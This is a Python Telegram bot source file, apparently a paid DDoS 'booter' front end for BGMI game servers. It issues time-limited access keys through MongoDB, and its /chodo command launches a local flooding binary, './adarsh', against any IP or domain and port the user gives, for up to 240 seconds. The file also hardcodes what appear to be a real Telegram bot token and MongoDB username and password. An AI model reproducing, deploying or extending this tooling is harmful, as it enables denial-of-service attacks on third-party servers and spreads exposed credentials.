import telebot
import subprocess
import threading
import os
import signal
import copy
import random
import string
import re
from datetime import datetime, timedelta
from pymongo import MongoClient
import time

BOT_TOKEN = "8026059055:AAE9J_EvjCE2ZVAiHSpexWgpobd-iKAzirU"
MONGO_URL = "mongodb+srv://loomjoom07_db_user:nana12@cluster0.ietahh1.mongodb.net/?appName=Cluster0"

print("Connecting to MongoDB...")
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000, connectTimeoutMS=5000)
    client.admin.command('ping')
    db = client["bot"]
    keys = db["keys"]
    users = db["users"]
    print("✅ MongoDB connected successfully!")
except Exception as e:
    print(f"⚠️ MongoDB connection warning: {e}")
    print("Retrying with relaxed SSL...")
    try:
        client = MongoClient(MONGO_URL, tls=True, tlsAllowInvalidCertificates=True, serverSelectionTimeoutMS=5000)
        db = client["bot"]
        keys = db["keys"]
        users = db["users"]
        print("✅ MongoDB connected with relaxed SSL!")
    except Exception as e2:
        print(f"❌ MongoDB connection failed: {e2}")
        exit(1)

from keep_alive import keep_alive
keep_alive()

BOT_OWNER = 7646520243
bot = telebot.TeleBot(BOT_TOKEN)

ALLOWED_GROUPS = {"-1002382674139"}
REQUIRED_CHANNELS = ["@BADMOSH10"]

feedback_pending = {}
fun_processes = {}
fun_owners = {}
fun_running = False

def generate_key(length=16):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    return None, None

def is_owner(user_id):
    return user_id == BOT_OWNER

def has_valid_key(user_id):
    user = users.find_one({"user_id": user_id})
    if not user:
        return False
    if user.get("key_expiry"):
        expiry = user["key_expiry"]
        if isinstance(expiry, str):
            expiry = datetime.fromisoformat(expiry)
        if datetime.now() > expiry:
            users.update_one({"user_id": user_id}, {"$unset": {"key": "", "key_expiry": ""}})
            return False
        return True
    return False

def get_time_remaining(user_id):
    user = users.find_one({"user_id": user_id})
    if not user or not user.get("key_expiry"):
        return "0 days 0 hours 0 minutes 0 seconds"
    expiry = user["key_expiry"]
    if isinstance(expiry, str):
        expiry = datetime.fromisoformat(expiry)
    remaining = expiry - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 days 0 hours 0 minutes 0 seconds"
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days} days {hours} hours {minutes} minutes {seconds} seconds"

def is_member(user_id):
    for channel in REQUIRED_CHANNELS:
        try:
            member_status = bot.get_chat_member(channel, user_id)
            if member_status.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            return False
    return True

def get_group_admins(group_id):
    admins = []
    try:
        members = bot.get_chat_administrators(group_id)
        for member in members:
            admins.append(member.user.id)
    except Exception as e:
        print(f"Error getting admins: {e}")
    return admins

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi key generate kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /gen <duration>\n\nFormat:\n• s = seconds\n• m = minutes\n• h = hours\n• d = days\n\nExamples: /gen 30s, /gen 5m, /gen 2h, /gen 7d")
        return
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    if not duration:
        bot.reply_to(message, "❌ Invalid duration format!")
        return
    key = f"BGMI-{generate_key(12)}"
    keys.insert_one({"key": key, "duration": duration.total_seconds(), "duration_label": duration_label, "created_at": datetime.now(), "created_by": user_id, "used": False, "used_by": None})
    bot.reply_to(message, f"✅ Key Generated!\n\n🔑 Key: `{key}`\n⏰ Duration: {duration_label}", parse_mode="Markdown")

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    if has_valid_key(user_id):
        remaining = get_time_remaining(user_id)
        bot.reply_to(message, f"❌ Tumhare paas already ek valid key hai!\n⏰ Remaining: {remaining}")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /redeem <key>")
        return
    key_input = command_parts[1].upper()
    key_doc = keys.find_one({"key": key_input})
    if not key_doc:
        bot.reply_to(message, "❌ Invalid key!")
        return
    if key_doc.get("used"):
        bot.reply_to(message, "❌ Ye key pehle se use ho chuki hai!")
        return
    expiry_time = datetime.now() + timedelta(seconds=key_doc["duration"])
    users.update_one({"user_id": user_id}, {"$set": {"user_id": user_id, "username": user_name, "key": key_input, "key_expiry": expiry_time, "redeemed_at": datetime.now()}}, upsert=True)
    keys.update_one({"key": key_input}, {"$set": {"used": True, "used_by": user_id, "used_at": datetime.now()}})
    remaining = get_time_remaining(user_id)
    bot.reply_to(message, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⏳ Time: {remaining}", parse_mode="Markdown")

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    user_id = message.from_user.id
    user = users.find_one({"user_id": user_id})
    if not user or not user.get("key"):
        bot.reply_to(message, "❌ Tumhare paas koi key nahi hai!")
        return
    if not has_valid_key(user_id):
        bot.reply_to(message, "❌ Tumhari key expire ho gayi!\n⏳ Remaining: 0 days 0 hours 0 minutes 0 seconds")
        return
    remaining = get_time_remaining(user_id)
    bot.reply_to(message, f"🔑 Your Key:\n\n📌 Key: `{user['key']}`\n⏳ Remaining: {remaining}\n✅ Status: Active", parse_mode="Markdown")

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf bot owner hi delete kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /delkey <key>")
        return
    key_input = command_parts[1].upper()
    result = keys.delete_one({"key": key_input})
    if result.deleted_count > 0:
        users.update_many({"key": key_input}, {"$unset": {"key": "", "key_expiry": ""}})
        bot.reply_to(message, f"✅ Key deleted!")
    else:
        bot.reply_to(message, "❌ Key nahi mili!")

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf owner!")
        return
    unused = list(keys.find({"used": False}))
    used = list(keys.find({"used": True}))
    response = f"📋 KEYS:\n🟢 Unused: {len(unused)}\n🔴 Used: {len(used)}\n\n"
    if unused:
        for k in unused[:5]:
            response += f"• `{k['key']}` ({k['duration_label']})\n"
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Sirf owner!")
        return
    user_list = list(users.find({"key": {"$exists": True}}).limit(10))
    if not user_list:
        bot.reply_to(message, "📋 No users!")
        return
    response = f"👥 Users: {len(user_list)}\n\n"
    for u in user_list:
        status = "✅" if u.get('key_expiry') and u['key_expiry'] > datetime.now() else "❌"
        response += f"{status} {u.get('username', 'Unknown')}\n"
    bot.reply_to(message, response, parse_mode="Markdown")

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    domain_pattern = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return domain_pattern.match(target) and len(target) <= 253

def start_fun(target, port, duration, message):
    global fun_running
    try:
        user_id = message.from_user.id
        chat_id = str(message.chat.id)
        feedback_pending[user_id] = True
        bot.reply_to(message, f"✅ Started on {target}:{port} for {duration}s")
        adarsh_path = os.path.abspath('./adarsh')
        process = subprocess.Popen([adarsh_path, target, str(port), str(duration), "900"], preexec_fn=os.setsid)
        fun_processes[chat_id] = process
        fun_owners[chat_id] = user_id
        fun_running = True
        process.wait()
        bot.reply_to(message, f"✅ Completed!")
        fun_processes.pop(chat_id, None)
        fun_owners.pop(chat_id, None)
        fun_running = False
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")
        fun_running = False

@bot.message_handler(commands=["chodo"])
def handle_fun(message):
    global fun_running
    user_id = message.from_user.id
    chat_id = str(message.chat.id)
    if chat_id not in ALLOWED_GROUPS:
        bot.reply_to(message, "❌ Group me use karo!")
        return
    if not is_member(user_id):
        bot.reply_to(message, f"❌ Join [BADMOSH10](https://t.me/BADMOSH10) first", parse_mode="Markdown")
        return
    if not is_owner(user_id) and not has_valid_key(user_id):
        bot.reply_to(message, "❌ Valid key chahiye!")
        return
    if feedback_pending.get(user_id, False):
        bot.reply_to(message, "❌ Pehle feedback do!")
        return
    if fun_running:
        bot.reply_to(message, "❌ Ek waqt pe sirf ek!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /chodo <target> <port> <time>")
        return
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    if not validate_target(target):
        bot.reply_to(message, "❌ Invalid target!")
        return
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid port!")
            return
        duration = int(duration)
        group_admins = get_group_admins(chat_id)
        max_duration = 240 if user_id in group_admins else 120
        if duration > max_duration:
            bot.reply_to(message, f"❌ Max {max_duration}s!")
            return
        thread = threading.Thread(target=start_fun, args=(target, port, duration, copy.deepcopy(message)))
        thread.start()
    except ValueError:
        bot.reply_to(message, "❌ Invalid input!")

@bot.message_handler(commands=["ruko"])
def stop_fun(message):
    global fun_running
    user_id = message.from_user.id
    chat_id = str(message.chat.id)
    group_admins = get_group_admins(chat_id)
    if user_id in group_admins or user_id == BOT_OWNER:
        if chat_id in fun_processes:
            process = fun_processes[chat_id]
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGINT)
                bot.reply_to(message, "🛑 Stopped!")
                fun_processes.pop(chat_id, None)
                fun_owners.pop(chat_id, None)
                fun_running = False
            except Exception as e:
                bot.reply_to(message, f"❌ Error: {e}")
        else:
            bot.reply_to(message, "❌ No active!")
    else:
        bot.reply_to(message, "❌ Only admin!")

@bot.message_handler(content_types=["photo"])
def handle_photo_feedback(message):
    user_id = message.from_user.id
    if feedback_pending.get(user_id, False):
        feedback_pending[user_id] = False
        bot.reply_to(message, "✅ Feedback received!")

@bot.message_handler(commands=['help'])
def show_help(message):
    user_id = message.from_user.id
    help_text = '🔐 COMMANDS:\n/redeem <key>\n/mykey\n/chodo <target> <port> <time>\n/ruko'
    if is_owner(user_id):
        help_text += '\n\n👑 ADMIN:\n/gen <time>\n/delkey <key>\n/allkeys\n/allusers'
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    bot.reply_to(message, f'☠️ Welcome {user_name}!\n\n/help for commands')

print("🤖 Bot is starting...")
try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"Error: {e}")
